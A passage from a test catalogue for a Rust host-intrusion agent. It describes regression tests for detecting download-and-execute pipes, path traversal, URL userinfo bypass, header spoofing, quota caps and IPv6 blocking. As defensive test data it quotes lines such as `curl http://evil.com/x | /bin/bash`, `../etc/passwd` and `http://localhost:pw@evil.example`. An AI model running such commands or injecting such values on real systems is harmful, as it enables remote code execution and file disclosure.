- `crates/agent/src/correlation_engine.rs::tests::self_traffic_suppression_does_not_match_full_untruncated_names` - the list pins the truncated kernel-truth shape (`innerwarden-age`, NOT `innerwarden-agent`). Anti-regression for someone "fixing" the truncation by adding the full names too.

- `crates/agent/src/correlation_engine.rs::tests::self_traffic_suppression_keeps_real_attacker_comms_alive` - common attacker tooling (`curl`, `wget`, `nc`, `python3`, `perl`, `ssh`, `bash`) is NOT in the suppression list. The carve-out is a tight allowlist, not a hole that disables CL-008.

### UTF-8 panic class (Wave 1 - AUDIT-WAVE1-UTF8 anchor)

- `crates/agent/src/text_util.rs::tests::multibyte_split_at_char_boundary_does_not_panic` - `safe_truncate` walks back to a UTF-8 char boundary instead of panicking on `&s[..N]`. Pinned the 2026-05-04 ultrareview class where 8 call sites (AI prompt builders, KG edge summary, agent-guard alert, Telegram alert, kill-chain stdout, honeypot SSH history) all DoSed on attacker-supplied multi-byte input.

- `crates/agent/src/text_util.rs::tests::three_byte_codepoint_splits_walk_back_correctly` - 3-byte codepoint (`€`) walked back correctly when `max` lands on byte 1 or 2.

- `crates/agent/src/text_util.rs::tests::four_byte_codepoint_emoji_splits_walk_back_correctly` - 4-byte codepoint (🦀) walked back correctly. Anti-regression for an attacker shipping emoji at exactly the truncation boundary.

- `crates/agent/src/text_util.rs::tests::long_attacker_string_with_max_inside_multibyte_does_not_panic` - realistic prod shape: `€` repeated 100 times truncated at byte 200 returns 198 bytes (66 codepoints) without panicking.

- `crates/agent/src/text_util.rs::tests::mixed_ascii_and_multibyte_truncates_at_the_first_unsplittable_boundary` - ASCII+multibyte mixed string truncates at the boundary before the unsplittable codepoint, never inside it.

- `crates/agent/src/dashboard/actions.rs::tests::validate_action_params_does_not_panic_on_multibyte_after_172_dot` - the `validate_action_params` 172.x check no longer does byte-slice `t[4..6]` (which panicked on `172.€16.0.1`-shaped attacker input). Now uses `split('.').nth(1).parse::<u8>()`, which is panic-free.

- `crates/agent/src/dashboard/actions.rs::tests::validate_action_params_allows_172_165_which_is_not_rfc1918` - anti-regression for the silent operator-impacting bug the byte-slice fix also resolved: `172.165.0.1` is in the PUBLIC range and must NOT be blocked. Pre-fix `t[4..6] = "16"` falsely matched the private range.

- `crates/agent/src/dashboard/actions.rs::tests::validate_action_params_still_blocks_real_172_16_through_172_31` - pins the RFC1918 172.16.0.0/12 block range so a future "fix" that off-by-ones the boundary fails at test time.

- `crates/agent/src/dashboard/actions.rs::tests::validate_action_params_allows_172_15_and_172_32_at_range_edges` - `172.15.0.1` and `172.32.0.1` are public and must pass.

### Security bypass class (Wave 2 - AUDIT-WAVE2 anchors)

- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::sanitize_sudoers_filename_segment_replaces_dots` - sudo's `includedir /etc/sudoers.d` silently skips files containing `.`. Real Linux usernames like `john.doe` were producing deny-rule filenames that sudo skipped, making the suspension a silent no-op. The sanitiser replaces `.` with `_` in the FILENAME only (the rule body keeps the real username so sudo matches the right account).
- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::sanitize_sudoers_filename_segment_replaces_tildes` - sudo also skips files ending in `~`. Same sanitiser, same intent.
- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::sanitize_sudoers_filename_segment_passes_safe_chars_through` - ASCII alphanumerics + `_` + `-` + `$` (SAMBA accounts) pass through unchanged. Anti-regression for an over-eager sanitiser that mangles legitimate usernames.
- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::sanitize_sudoers_filename_segment_handles_combined_skip_chars` - `john.doe~backup` (both skip-char classes) becomes `john_doe_backup`.
- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_with_downloader_in_middle_segment` - `check_download_execute_pipe` scans for the downloader in ANY pipe segment (not only `parts[0]`). The pre-fix `parts[0]`-only check was trivially evaded by `cmd | curl evil.com | bash`.
- `crates/agent-guard/src/threats.rs::tests::does_not_detect_executor_before_downloader` - temporal correctness: an executor BEFORE the downloader is not a download-and-execute chain. Anti-regression for a future "any executor anywhere" simplification that would over-trigger.
- `crates/agent-guard/src/threats.rs::tests::does_not_detect_downloader_without_subsequent_executor` - `curl evil.com | tee out.txt` (download + non-executor) must NOT trip this specific detector.
- `crates/agent-guard/src/threats.rs::tests::does_not_detect_double_pipe_with_only_downloader` - downloader followed by non-executor pipes (`grep | wc`) must not trigger.

### AbuseIPDB burst cap bypass (Wave 3 - AUDIT-WAVE3-BURST-CAP anchor)

- `crates/agent/src/abuseipdb_report_budget.rs::tests::plan_burst_within_cap_bypasses_pre_fix_but_now_caps_correctly` - the headline anchor: counter at 750, cap 800, batch of 100 ready items. Pre-fix planned 100 sends (all read counter=750 < 800), post-fix plans 50 sends + 50 skips with `DailyCapReached`. The in-batch counter `planned_sends_this_batch` short-circuits the cap before the batch dispatches.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::plan_keeps_normal_within_cap_passing_when_no_burst` - 5 items at counter 0 cap 800 must all Send. Anti-regression for the in-batch counter accidentally double-counting.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::plan_burst_exactly_at_remaining_cap_lands_no_skips` - boundary: counter 798, cap 800, batch of 2. Both Send.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::plan_burst_one_over_remaining_cap_skips_the_overflow` - same boundary + 1: batch of 3 produces 2 sends + 1 skip.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::plan_burst_with_cloud_safelist_does_not_consume_cap` - cloud-safelist hits go to `SkipCloud`, NOT `Send`, so they MUST NOT consume `planned_sends_this_batch` slots. Anti-regression for accidentally bumping the in-batch counter before the safelist short-circuit.

### Sync I/O in async cleanup_expired_* (Wave 3 - AUDIT-WAVE3-SYNC-IO anchor)

- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::enumerate_expired_suspensions_returns_only_expired_entries` - the pure-sync helper `enumerate_expired_suspensions_sync` filters expired entries, removes corrupt JSON inline, ignores non-`.json` files, and retains fresh entries. Pinned the 2026-05-04 ultrareview class where 3 async cleanup_expired_* fns blocked the tokio runtime via `std::fs::read_dir` + per-file `std::fs::read_to_string`. The fix offloads enumeration to `spawn_blocking` and routes per-entry deletes through `tokio::fs::remove_file`.
- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::enumerate_expired_suspensions_empty_dir_returns_empty_vec` - empty dir does not error, returns empty vec.
- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::enumerate_expired_suspensions_missing_dir_errors_with_context` - missing dir errors with the `read_dir <path>` context the caller can log usefully.
- `crates/agent/src/skills/builtin/rate_limit_nginx.rs::tests::enumerate_expired_nginx_blocks_returns_only_expired_entries` - same contract for the nginx variant.
- `crates/agent/src/skills/builtin/rate_limit_nginx.rs::tests::enumerate_expired_nginx_blocks_empty_dir` - empty dir non-error path.
- `crates/agent/src/skills/builtin/block_container.rs::tests::enumerate_expired_container_blocks_returns_only_expired_entries` - same contract for the container variant.
- `crates/agent/src/skills/builtin/block_container.rs::tests::enumerate_expired_container_blocks_includes_non_pause_actions` - the helper returns non-pause expired entries too (the async caller branches on `action` after enumeration). Anti-regression for filtering them at the helper layer.

### Decisions hash-chain race (Wave 3 - AUDIT-WAVE3-CHAIN-RACE anchor)

- `crates/agent/src/decisions.rs::tests::concurrent_append_chained_does_not_fork_the_hash_chain` - 4 OS threads each calling `append_chained` 25 times against the same data_dir produce a strictly-linear chain (no two entries share a non-None `prev_hash`, every `prev_hash` matches its predecessor's SHA-256). Pinned the 2026-05-04 ultrareview class where `DecisionWriter::write` and `append_chained` both did `read_last_hash` then `writeln!` without a file lock, letting two concurrent appenders produce a forked chain. The fix routes both writers through `append_chained_locked` which holds `flock(LOCK_EX)` over the read-hash + write + flush sequence.
- `crates/agent/src/decisions.rs::tests::append_chained_persists_entries_in_strict_serialization_order` - single-threaded baseline: 5 sequential appends produce 5 lines forming a strict prev_hash → hash chain. Anti-regression for accidentally introducing batching that violates the one-entry-per-flush invariant.
- `crates/agent/src/decisions.rs::tests::struct_writer_and_append_chained_share_one_linear_chain` - cross-path interleave: 5 writes split across `DecisionWriter::write` (BufWriter struct path) and bare `append_chained` (honeypot path) produce one linear chain. Anti-regression for the always-on honeypot vs slow-loop race that motivated the original ultrareview finding.
- `crates/agent/src/decisions.rs::tests::is_iso_date_rejects_path_traversal_shapes` - `is_iso_date` rejects `../etc/pwd`, `..\\windows`, NUL injection, and slash-instead-of-dash variants. Pin so a future "loosen the validator to accept yyyy/mm/dd" tweak fails CI loudly - the validator is the CodeQL-visible CWE-22 sanitiser for the daily JSONL filename.
- `crates/agent/src/decisions.rs::tests::append_chained_locked_refuses_non_iso_date_segment` - the validator fires BEFORE any open()/lock() syscall when a non-ISO-date segment (e.g. `../etc/passwd`) is passed. Anti-regression for accidentally moving the check after the path is constructed.
- `crates/agent/src/decisions.rs::tests::is_iso_date_rejects_path_traversal_and_garbage` - the `today` segment of the daily-JSONL path is validated to `\d{4}-\d{2}-\d{2}` before any filesystem call. Anti-regression for accidentally letting attacker-controlled input reach the path-construction layer (CodeQL CWE-22 path traversal). Tests every shape an attacker would try: `../etc/passwd`, `2026-05-04\0`, `2026-05-*`, leading/trailing spaces, wrong digit widths.

### IPv6/IPv4 holes (Wave 4 - AUDIT-WAVE4 anchor)

- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_unblock_ip_handles_ipv6_addresses` - the headline anchor: `xdp_unblock_ip` no longer assumes IPv4. A v6 unblock routes to `BLOCKLIST_V6_PIN` with 16 key bytes. Pre-fix any IPv6 entry that `execute()` inserted into the v6 map was never removed even after the operator (or TTL sweep) requested removal.
- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_unblock_ip_handles_ipv4_addresses` - anti-regression: v4 unblock still routes to `BLOCKLIST_PIN` with 4 key bytes.
- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_unblock_ip_handles_ipv6_loopback` - `::1` (15 zero bytes + `1`) parses correctly.
- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_unblock_ip_rejects_garbage_input` - invalid input (non-IP, malformed v4/v6) is rejected with a clear error.
- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_blocklist_pin_for_ip_routes_v4_and_v6_to_distinct_maps` - `xdp_blocklist_pin_for_ip` returns the IPv4 pin path for an `Ipv4Addr` shape and the IPv6 pin path for an `Ipv6Addr` shape, with no overlap. Anti-regression for accidentally collapsing the two maps in a future refactor (which would silently break IPv6 unblock — the actual prod failure mode).
- `crates/agent/src/skills/builtin/block_ip_xdp.rs::tests::xdp_blocklist_pin_for_ip_returns_none_for_garbage` - the helper returns `None` on non-IP input so callers can drop the local poison entry without invoking `bpftool`. Pin the contract that the boot-loop TTL expiry path depends on.
- `crates/agent/src/loops/boot.rs::tests::xdp_ttl_cleanup_calls_v6_pin_for_ipv6_entries` - the boot-loop TTL expiry path (the actual prod path for adaptive XDP unblock) routes IPv6 entries through `BLOCKLIST_V6_PIN` instead of dropping them as "poison". Pre-fix the loop did `ip.parse::<Ipv4Addr>()` and called `state.xdp_block_times.remove(ip)` on every IPv6 entry, leaving the kernel `BLOCKLIST_V6_PIN` map populated forever — even after the TTL expired.
- `crates/agent/src/ai/mod.rs::tests::extract_url_host_handles_ipv6_bracket_with_port_and_path` - the headline anchor: `extract_url_host("[::1]:11434/api/generate")` returns `"::1"`. Pre-fix the splitting strategy returned `"["` and `validate_ai_base_url` rejected every operator running a local IPv6 LLM endpoint.
- `crates/agent/src/ai/mod.rs::tests::extract_url_host_handles_ipv6_bracket_no_port` - `[::1]` and `[::1]/api` round-trip too.
- `crates/agent/src/ai/mod.rs::tests::extract_url_host_handles_ipv6_bracket_with_full_address` - `[2001:db8::1]:443/v1` extracts `2001:db8::1`.
- `crates/agent/src/ai/mod.rs::tests::extract_url_host_strips_userinfo_before_authority_split` - `user@host` and `user:pass@host` produce `host`, not `user`. Pre-fix `extract_url_host("localhost:pw@evil.example")` returned `"localhost"` (split-on-`:`-first) and `validate_ai_base_url("http://localhost:pw@evil.example")` accepted the URL as loopback even though the real authority is `evil.example`. Anti-regression for the URL-userinfo-bypass class on the AI-base-URL HTTP gate.
- `crates/agent/src/ai/mod.rs::tests::validate_ai_base_url_rejects_userinfo_bypass_remote` - end-to-end: `http://localhost:pw@evil.example` is REFUSED, not silently accepted. Anti-regression for the same userinfo bypass on the high-level gate.
- `crates/agent/src/ai/mod.rs::tests::validate_ai_base_url_accepts_ipv6_loopback_http_with_port_and_path` - end-to-end: every shape an operator running Ollama / vLLM on IPv6 loopback would write (`http://[::1]:11434/api/generate`) now passes the gate.
- `crates/agent/src/ai/mod.rs::tests::validate_ai_base_url_still_accepts_existing_loopback_forms` - anti-regression: `localhost` and `127.0.0.1` still work.
- `crates/agent/src/ai/mod.rs::tests::validate_ai_base_url_still_rejects_remote_http` - anti-regression: tightening the host extractor must NOT weaken the security gate. Remote HTTP (any non-loopback host, including remote IPv6 like `[2001:db8::1]`) is still refused.

### Doc drift (Wave 5 - AUDIT-WAVE5-DOC-DRIFT anchor)

- `crates/agent/src/dashboard/auth.rs::tests::threat_model_md_quotes_actual_global_rate_limit` - THREAT_MODEL.md quotes the literal `GLOBAL_RATE_LIMIT_PER_MIN` value. Anti-regression: pre-fix the doc said `120 req/min/IP` while the constant was 300; CI now fails if the two diverge so a future bump must update both.
- `crates/agent/src/dashboard/auth.rs::tests::security_md_supported_versions_matches_current_minor` - SECURITY.md lists the current `vMAJOR.MINOR.x` line as supported. Pre-fix it still said `v0.1.x` at v0.13.0. CI fails on every minor bump until SECURITY.md is also updated.
- `crates/agent/src/dashboard/auth.rs::tests::threat_model_md_does_not_quote_stale_rate_limit_value` - partial-edit anti-regression: walks every `<N> req/min/IP` shape in THREAT_MODEL.md and asserts each matches `GLOBAL_RATE_LIMIT_PER_MIN`. A future bump that updates only ONE doc mention while leaving a stale duplicate fails CI loudly.
- `crates/agent/src/dashboard/auth.rs::tests::security_md_lists_only_current_minor_as_supported` - partial-edit anti-regression: walks every "Yes"-marked row in the SECURITY.md supported-versions table and asserts the version token matches the current `CARGO_PKG_VERSION` minor. A future minor bump that adds the new row but leaves a stale `v0.X.x | Yes` line elsewhere fails CI — older lines must be `No`.

### String interning hot paths (Wave 6 - AUDIT-WAVE6-INTERN anchor)

- `crates/agent/src/correlation_engine.rs::tests::correlation_event_source_and_kind_share_arc_allocations` - 1000 `CorrelationEvent` instances built from raw `Event` shapes that share `source="auth_log"` and `kind="ssh.login_failed"` produce a window where every entry's `source` and `kind` `Arc<str>` is pointer-equal to entry [0]'s. Anti-regression for reverting either field back to `String` (which would silently allocate 1000 independent heap copies, defeating the Wave 6 win on the 10 000-entry `event_window`).

### String interning hot paths v2 (Wave 6b - AUDIT-WAVE6B-INTERN anchor)

- `crates/agent/src/telemetry.rs::tests::observe_events_interns_collector_key_via_arc_str` - 1000 events with `source="auth_log"` produce a `events_by_collector` BTreeMap with ONE entry whose key is pointer-equal to `intern("auth_log")`. Anti-regression for reverting `events_by_collector: BTreeMap<Arc<str>, u64>` back to `BTreeMap<String, u64>` (which would silently allocate-and-drop 1000 fresh Strings on the per-event hot path).
- `crates/agent/src/telemetry.rs::tests::telemetry_snapshot_arc_str_keys_round_trip_through_json` - JSON serialize → deserialize round-trip on `TelemetrySnapshot` keeps the wire format identical to pre-Wave-6b (keys appear as plain JSON strings). Anti-regression for accidentally serializing `Arc<str>` as a tagged structure that would break older agents reading the same telemetry file.
- `crates/agent/src/baseline.rs::tests::observe_event_interns_current_hour_counts_key` - 1000 events with `source="auth_log"` produce a `current_hour_counts` HashMap with ONE entry pointer-equal to `intern("auth_log")`. Same pattern as the telemetry anchor — proves the per-event interning is wired at the baseline insert site.
- `crates/agent/src/baseline.rs::tests::observe_event_interns_user_login_hours_key` - 100 successful logins for `ubuntu` produce one `user_login_hours` entry whose key is pointer-equal to `intern("ubuntu")`. Anti-regression for reverting the username key type, which would re-introduce per-login `String` churn even though only ~50 distinct usernames exist on a typical host.
- `crates/agent/src/baseline.rs::tests::observe_event_interns_process_lineages_member` - 200 events for the same `parent→child` lineage produce ONE `process_lineages` set member pointer-equal to `intern("parent→child")`. Pins the interning on the lineage write path; lineage strings repeat across every observed event from the same parent chain.
- `crates/agent/src/baseline.rs::tests::baseline_store_arc_str_keys_round_trip_through_json` - JSON serialize → deserialize on `BaselineStore` preserves keys as plain strings on disk. Pre- and post-Wave-6b agents must be able to load the same `baseline.json`.

### String interning hot paths v3 (Wave 6c - AUDIT-WAVE6C-INTERN anchor)

- `crates/agent/src/knowledge_graph/ingestion.rs::tests::record_event_telemetry_interns_source_and_kind_keys` - 1000 calls to `record_event_telemetry("auth_log", "ssh.login_failed", _)` produce `KnowledgeGraph::source_counts` and `KnowledgeGraph::kind_counts` HashMaps each with ONE entry, pointer-equal to `intern("auth_log")` / `intern("ssh.login_failed")`. Anti-regression for reverting the KG event-telemetry counter map types from `HashMap<Arc<str>, usize>` back to `HashMap<String, usize>` — that revert would silently re-introduce per-event String churn on the ingest hot path.
- `crates/agent/src/knowledge_graph/ingestion.rs::tests::record_event_telemetry_interns_event_timeline_keys` - 200 calls at the same bucket produce a `event_timeline: BTreeMap<Arc<str>, HashMap<Arc<str>, _>>` with ONE outer entry whose key is pointer-equal to `intern(<bucket>)` AND ONE inner entry whose key is pointer-equal to `intern("auth_log")`. Pins both axes of the nested map; reverting either fails the test.

### Cloudflare attribution rewrite (Wave 9 - AUDIT-WAVE9-CF-ATTRIBUTION anchor)

- `crates/sensor/src/collectors/http_capture.rs::tests::parse_cf_connecting_ip_header_present` - the HTTP parser extracts `CF-Connecting-IP` (canonical casing) into `HttpRequest::cf_connecting_ip`. Anti-regression for accidentally dropping the header on a future parser refactor — without this field the agent's CF rewrite is a no-op.
- `crates/sensor/src/collectors/http_capture.rs::tests::parse_cf_connecting_ip_header_lowercase` - lowercase `cf-connecting-ip` parses too (HTTP header names are case-insensitive per RFC 7230).
- `crates/sensor/src/collectors/http_capture.rs::tests::parse_cf_connecting_ip_absent_yields_empty_string` - when the header is missing the field is empty, NOT a sentinel — agent treats empty as "header absent" and falls back to socket-peer attribution.
- `crates/sensor/src/collectors/http_capture.rs::tests::parse_x_forwarded_for_keeps_raw_chain` - `X-Forwarded-For: <client>, <proxy>` is preserved raw — splitting/policy is the agent's responsibility.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_thirty_two_cf_edges_resolve_to_one_real_client` - the headline anchor: 8 representative CF edge IPs (from the real 2026-05-05 prod incident) all sharing one `CF-Connecting-IP=203.0.113.42` resolve to ONE client. Pre-Wave-9 the same scanner via CF appeared as 32 separate attackers on Threats / 32 CF datacenter pins on the public map.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_non_cf_peer_with_spoofed_header_is_rejected` - the security anchor: a non-CF peer (8.8.8.8) setting `CF-Connecting-IP: 127.0.0.1` does NOT trigger rewrite. Defence against attacker-supplied spoofed headers; trust gate is `is_cloudflare_edge_ip(socket_peer)`.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_cf_peer_without_header_is_not_rewritten` - CF socket peer without the header → no rewrite (keep CF edge IP as attribution; never falsify via XFF).
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_malformed_cf_header_is_rejected` - `cf_connecting_ip: "../etc/passwd"` is rejected. An attacker who somehow got onto a CF edge peer cannot inject non-IP shapes to break downstream geo/block logic.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_missing_src_ip_does_not_panic` - defensive: events with no `src_ip` field don't panic the rewrite path (production never produces these but a malformed event must not crash the loop).
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_recognises_every_cloudflare_cidr_range` - one representative IP from each of the 14 published CF CIDR ranges classifies as a CF edge. If CF publishes a new range, both `CLOUDFLARE_RANGES` (constant) and this test must update in lockstep.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_rejects_aws_azure_oracle_as_cf_edges` - random non-CF IPs (Google DNS, AWS CloudFront, Azure, Oracle, loopback) are NOT classified as CF edges. Anti-regression for accidentally widening the trust gate.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_rewrite_events_for_cloudflare_collapses_entities_too` - end-to-end Event-level rewrite: 3 CF-edge events with shared client collapse to 1 unique IP across BOTH `details.src_ip` AND `event.entities` (the EntityRef::ip that drives KG node creation). Dashboard "32 distinct attackers" rendering is driven off entities — rewriting only details would have left them stale.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_rewrite_events_does_not_touch_non_cf_events` - mixed-batch invariant: in a batch with one CF event + one non-CF event, the rewrite touches ONLY the CF event. Anti-regression for accidentally widening the rewrite scope.

### Public block count semantics (Wave 10b - AUDIT-WAVE10B-NON-INCIDENT-BLOCKS anchor)

- `crates/agent/src/dashboard/live_feed.rs::tests::count_unique_ips_blocked_counts_honeypot_abuseipdb_blocks` - 3 honeypot AbuseIPDB block decisions with empty `real_ids` produce `total_blocked=3`. Pre-Wave-10b returned 0 because the function required `real_ids` membership; the operator hit "0 blocked" on the public site on 2026-05-05 while 450 real auto-blocks happened that day.
- `crates/agent/src/dashboard/live_feed.rs::tests::count_unique_ips_blocked_counts_repeat_offender_and_proto_anomaly` - the four other non-incident-pipeline auto-block paths (`repeat-offender:`, `proto_anomaly:`, `suspicious_archive:`, `logging_config_change:`) each contribute to the public count.
- `crates/agent/src/dashboard/live_feed.rs::tests::count_unique_ips_blocked_still_dedupes_across_incident_and_non_incident_paths` - same IP blocked via incident pipeline AND repeat-offender ladder counts ONCE. Anti-regression for double-counting after Wave 10b widened the classifier.
- `crates/agent/src/dashboard/live_feed.rs::tests::count_unique_ips_blocked_still_rejects_unknown_non_incident_shape` - decision with unknown `incident_id` shape and no `real_ids` match is rejected. Pins the conservative classifier — a future internal/research-only block path can't accidentally inflate the public counter.
- `crates/agent/src/dashboard/live_feed.rs::tests::is_public_block_decision_recognises_all_known_prefixes` - the allow-list of non-incident-pipeline `incident_id` prefixes is pinned. Adding a new auto-block path is a deliberate change to both the helper AND this test in the same PR.

### Number-consistency labels (Wave 10 - AUDIT-WAVE10-LABEL-HONESTY anchor)

- `crates/agent/src/dashboard/mod.rs::tests::wave10_home_activity_strip_reads_handled_not_stopped` - the home activity strip cell that aggregates blocked + observing + honeypot reads "handled automatically", NOT "stopped automatically". The pre-Wave-10 copy lied for the observing bucket (observing means we are watching, not stopping). Anti-regression: the old "stopped automatically" string must NOT come back.
- `crates/agent/src/dashboard/mod.rs::tests::threats_kpi_tile_label_is_blocks_not_blocked` (extended in Wave 10) - the Threats KPI tile reads "Block actions" / "today" (aggregate, decisions) and the sidebar group reads "Currently blocked attackers" (snapshot, unique IPs). Pre-Wave-10 the labels read "Blocks · Today" and "Blocked attackers" — same page, different answers, no copy disclosing the snapshot-vs-aggregate axis. Operator's hard rule (2026-05-05): every label must explicitly disclose window + scope + cardinality unit. The test name predates Wave 10 (kept for git-blame continuity); the docstring has been updated to reflect the new disambiguation pair.
- `crates/agent/src/dashboard/mod.rs::tests::wave10_live_feed_clips_to_rolling_24h_matching_site_label` - the public live-feed builder (`build_live_feed_response`) clips `real_incidents` to `now - 24h` so the site's hardcoded "(24h)" labels (`Live.tsx:415,422,429`) match the underlying data. Source-grep anchor: pins `cutoff_24h = now - chrono::Duration::hours(24)` AND `i.ts >= cutoff_24h` filter in active code. A future "remove the cutoff for performance" PR fails CI loudly.

### Notification noise + Top-5 leftovers (AUDIT-NOISE-A / NOISE-B / WAVE-T5-3 / WAVE-T5-4)

- `crates/agent/src/notification_gate.rs::tests::compromise_contained_defers_to_daily_briefing` - Bug A anchor: compromise + contained MUST NOT trigger SendNow; defer to the daily briefing. Pre-fix the operator received 3 Critical Telegram pings for the same `kill_chain:detected:DATA_EXFIL` incident even though killchain inline had already auto-blocked the IP. Anti-regression for re-promoting "compromise alone → SendNow".
- `crates/agent/src/notification_gate.rs::tests::compromise_uncontained_sends` - Bug A counter-anchor: real compromise that is NOT contained still SendNow. A future "always defer compromise" refactor must NOT silently suppress unblocked compromise alerts.
- `crates/agent/src/notification_gate.rs::tests::contract_full_precedence_table` - Bug A precedence-table anchor: pins the full Cartesian (compromise, active, contained, probe) → verdict matrix in one place. The compromise+contained row IS the Bug A fix; the rest are anti-regression bounds for the surrounding rules.
- `crates/agent/src/notification_pipeline.rs::tests::self_traffic_loopback_ip_is_suppressed_from_grouping` - Bug B anchor: incidents whose primary entity is `127.0.0.1` (IPv4 loopback) are suppressed from the grouping engine. Pre-fix the operator received daily briefings reading "🟠 4 dns_tunneling from 127.0.0.1".
- `crates/agent/src/notification_pipeline.rs::tests::self_traffic_ipv6_loopback_is_suppressed_from_grouping` - Bug B anchor (IPv6): `::1` is also self-traffic. Anti-regression for dropping the IPv6 path in `is_self_traffic_entity`.
- `crates/agent/src/notification_pipeline.rs::tests::external_attacker_ip_still_creates_grouping_entry` - Bug B anti-regression bound: real external attackers (TEST-NET-3 `203.0.113.42`) still create groups. Defends against accidentally widening the self-traffic filter to public IPs and silently dropping every alert.
- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_skill_id_uses_operator_configured_backend_iptables` - Top-5 #3 anchor: the classifier emits `skill_id="block-ip-iptables"` when the operator configured `block_backend = "iptables"`. Pre-fix the classifier was the only auto-block site that hardcoded `block-ip-ufw`, ignoring `cfg.responder.block_backend`; on a host running iptables / nftables / pf the executor would either reject the skill or run ufw in parallel.
- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_skill_id_uses_operator_configured_backend_nftables` - Top-5 #3 anchor (nftables variant).
- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_skill_id_uses_operator_configured_backend_pf` - Top-5 #3 anchor (pf variant; macOS / BSD operators).
- `crates/agent/src/ai/local_classifier.rs::tests::block_ip_skill_id_uses_operator_configured_backend_xdp` - Top-5 #3 anchor (xdp variant; production prod backend on the live server).
- `crates/agent/src/loops/boot.rs::tests::build_primary_provider_accepts_iptables_backend_signature` - Top-5 #3 plumbing anchor: the boot-layer `build_primary_provider(cfg, block_backend)` call shape. Pre-fix the function signature did not even accept `block_backend`. Pins the call shape so a future revert that drops the parameter would fail CI before the deeper classifier-side anchors ever run.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::dispatch_failed_report_preserves_daily_quota_and_dedup` - Top-5 #4 headline anchor: HTTP failure (`report_fn` returns `false`) MUST NOT increment the daily counter and MUST NOT write the dedup entry; `dropped_failed` reflects the failure and the same IP is retryable on the next flush. Pre-fix `commit.apply()` always ran and a 5xx from AbuseIPDB permanently consumed one slot of the operator's daily 800 quota.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::dispatch_successful_report_consumes_daily_quota_and_dedup` - Top-5 #4 success-path anchor: HTTP success advances the counter and writes the dedup entry. Anti-regression for an over-eager "skip commit" refactor that would also suppress success.
- `crates/agent/src/abuseipdb_report_budget.rs::tests::dispatch_mixed_success_and_failure_only_commits_successes` - Top-5 #4 mixed-batch anchor: in a 3-item burst with one HTTP failure in the middle, only the two successes consume slots and write dedup entries; the failed IP remains retryable. Pins per-item commit isolation.

### Agent-guard pipe absolute-path evasion (Top-5 #5 - AUDIT-WAVE-T5-5)

- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_with_absolute_path_executor_bin_bash` - Top-5 #5 headline anchor: `curl http://evil.com/x | /bin/bash` MUST trip the detector. Pre-fix the executor check used `w.trim_start_matches("./") == *e`, normalising only the relative `./bash` form; absolute paths slipped through string equality. PR #456 (Wave 2) closed the pipe-reorder evasion; this anchor closes the absolute-path evasion that was still wide open in the same Top-5 finding.
- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_with_absolute_path_executor_usr_bin_python` - same pattern for `/usr/bin/python`. Pins that the basename normalisation is symmetric across every entry in `EXECUTORS`, not specific to bash.
- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_with_absolute_path_executor_unusual_prefix` - `/system/bin/sh` (Android-style prefix). Anti-regression for accidentally hardcoding `/bin/` / `/usr/bin/` instead of "anything before the last slash".
- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_combining_pipe_reorder_and_absolute_path` - layered evasion: downloader in middle segment (Wave 2 territory) + absolute-path executor (this fix). Pins that the two fixes compose correctly so `ls | curl http://evil.com/x | /bin/bash -c id` still trips.
- `crates/agent-guard/src/threats.rs::tests::does_not_detect_path_lookalike_words` - anti-regression bound: `curl ... | /bin/foo` MUST NOT trip. The basename strip operates on `/`, not on a similarity widening; only basenames in `EXECUTORS` count.
- `crates/agent-guard/src/threats.rs::tests::does_not_detect_executor_substring_inside_word` - anti-regression bound: `bashfoo` and `/usr/bin/bashfoo` MUST NOT trip. Basename comparison is exact equality, not substring containment, so attacker-named binaries like `bashfoo` cannot exploit a weakened comparison.
- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_with_executor_first_arg_after_basename` - `/bin/bash -c 'whoami'` shape: pins that `split_whitespace().next()` is what gets basename-checked, so executor + args still trips. Anti-regression for accidentally checking the LAST whitespace token instead of the first.

### KG-derived decide modifier (Spec 043 Phase 1 - AUDIT-SPEC043-PHASE1)

- `crates/agent/src/kg_decide_features.rs::tests::extract_features_from_fixture_graph` - the headline anchor: feature extraction over a fixture KG with one IP node + 5 benign + 2 malicious incidents (all within the 7d window) yields `prior_incidents_24h=7`, `risk_score=12`, `first_seen_age_days=45`, and `benign_history_score ≈ 5/7 ≈ 0.714`. Pins the math + the field-extraction contract; future schema change (e.g. renaming `false_positive` field on Node::Incident) fails CI.
- `crates/agent/src/kg_decide_features.rs::tests::compute_modifier_benign_history_yields_negative` - the strongest benign band (`-0.30`) requires ALL FOUR sub-conditions (history>=0.90, risk<20, age>=30d, no recent activity). Anti-regression for loosening any one and silently increasing FN rate.
